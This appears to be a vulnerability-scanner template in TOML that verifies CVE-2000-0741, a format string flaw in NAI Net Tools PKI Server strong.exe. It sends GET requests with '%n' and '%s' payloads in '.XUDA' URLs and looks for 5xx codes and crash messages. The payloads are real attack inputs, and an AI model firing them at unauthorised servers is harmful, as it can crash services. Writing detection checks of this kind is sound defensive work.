[info]
author = "ave"
description = "验证 NAI Net Tools PKI Server 1.0 strong.exe 格式字符串漏洞，通过发送包含格式化字符串的 .XUDA 扩展名 URL 触发漏洞"
id = "POC-AVE-2000-0571"
name = "CVE-2000-0741 PoC"
severity = "high"
tags = ["ave-2000-0571"]
vuln_id = [
    "CVE-2000-0741",
    "AVE-2000-0571",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/%n%n%n%n.XUDA"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "format string",
    "format",
    "strong.exe",
    "crash",
    "exception",
    "access violation",
]

[[poc.requests]]
method = "GET"
path = "/%s%s%s%s.XUDA"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "format string",
    "format",
    "strong.exe",
    "crash",
    "exception",
    "access violation",
]

[[poc.requests]]
method = "GET"
path = "/AAAA%n%n%n%n.XUDA"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "format string",
    "format",
    "strong.exe",
    "crash",
    "exception",
    "access violation",
]
